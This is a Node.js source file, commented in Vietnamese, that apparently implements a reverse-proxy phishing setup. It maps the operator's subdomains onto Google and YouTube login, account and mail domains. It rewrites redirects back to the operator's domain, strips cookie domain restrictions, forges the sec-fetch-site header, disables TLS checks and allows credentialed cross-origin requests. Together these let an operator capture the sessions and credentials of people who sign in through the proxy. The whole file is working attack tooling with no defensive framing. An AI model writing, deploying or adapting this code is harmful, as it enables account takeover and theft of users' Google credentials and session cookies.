const { createProxyMiddleware } = require("http-proxy-middleware");
const url = require("url");

// Mapping: subdomain của bạn → domain thật của Google
const DOMAIN_MAP = {
  "yt": "https://www.youtube.com",
  "accounts": "https://accounts.youtube.com", 
  "accounts-google": "https://accounts.google.com",
  "myaccount": "https://myaccount.google.com",
  "content": "https://accounts.google.com", // cho signin/v2/identifier
  "mail": "https://mail.google.com",
  "play": "https://play.google.com",
  "ogs": "https://ogs.google.com",
  "ssl": "https://ssl.gstatic.com",
  "www-google": "https://www.google.com",
  "fonts": "https://fonts.googleapis.com",
  "fonts-gstatic": "https://fonts.gstatic.com",
  "lh3": "https://lh3.googleusercontent.com",
  "i-ytimg": "https://i.ytimg.com",
  "redirector": "https://redirector.googlevideo.com",
  "googlevideo": "https://googlevideo.com",
};

module.exports = (req, res) => {
  const host = req.headers.host || "";
  const subdomain = host.split('.')[0]; // lấy phần đầu của domain
  
  // Xác định target từ subdomain
  let target = DOMAIN_MAP[subdomain] || "https://www.youtube.com";
  
  // Fallback: detect từ referer hoặc path
  const referer = req.headers.referer || "";
  if (!DOMAIN_MAP[subdomain]) {
    if (referer.includes("accounts.google")) target = "https://accounts.google.com";
    else if (referer.includes("accounts.youtube")) target = "https://accounts.youtube.com";
    else if (req.url.includes("/ServiceLogin") || req.url.includes("/signin")) {
      target = "https://accounts.google.com";
    }
  }

  console.log(`[${subdomain}] ${req.method} ${req.url} → ${target}`);

  createProxyMiddleware({
    target,
    changeOrigin: true,
    secure: false,
    followRedirects: true,
    
    // Tự động rewrite tất cả link trong response
    onProxyRes: (proxyRes, req, res) => {
      const location = proxyRes.headers.location;
      if (location) {
        // Rewrite redirect URL từ Google → về domain của mình
        proxyRes.headers.location = rewriteGoogleUrl(location, req.headers.host);
      }
      
      // Set CORS headers cho phép cross-origin
      proxyRes.headers["access-control-allow-origin"] = "*";
      proxyRes.headers["access-control-allow-credentials"] = "true";
    },
    
    // Rewrite cookie domain
    onProxyReq: (proxyReq, req) => {
      // Xóa header nguy hiểm
      proxyReq.setHeader("sec-fetch-site", "same-origin");
    },
    
    // Xử lý path
    pathRewrite: (path, req) => {
      // Nếu là accounts.google.com, giữ nguyên path
      return path;
    },
    
    // Cookie rewrite quan trọng
    cookieDomainRewrite: {
      "*": "", // Xóa domain restriction của cookie
    },
    
    // SSL
    ssl: { rejectUnauthorized: false },
    
  })(req, res);
};

// Hàm rewrite URL Google → domain của bạn
function rewriteGoogleUrl(originalUrl, currentHost) {
  if (!originalUrl.startsWith("http")) return originalUrl;
  
  const parsed = new URL(originalUrl);
  const hostname = parsed.hostname;
  
  // Reverse mapping: domain thật → subdomain của bạn
  const reverseMap = {
    "www.youtube.com": "yt",
    "accounts.youtube.com": "accounts", 
    "accounts.google.com": "accounts-google",
    "myaccount.google.com": "myaccount",
    "mail.google.com": "mail",
    "play.google.com": "play",
    "ogs.google.com": "ogs",
    "ssl.gstatic.com": "ssl",
    "www.google.com": "www-google",
    "fonts.googleapis.com": "fonts",
    "fonts.gstatic.com": "fonts-gstatic",
    "lh3.googleusercontent.com": "lh3",
    "i.ytimg.com": "i-ytimg",
    "googlevideo.com": "googlevideo",
  };
  
  const sub = reverseMap[hostname];
  if (!sub) return originalUrl; // Không phải domain Google, giữ nguyên
  
  // Thay thế domain
  const baseDomain = currentHost.split('.').slice(1).join('.'); // your-domain.com
  parsed.hostname = `${sub}.${baseDomain}`;
  
  return parsed.toString();
}
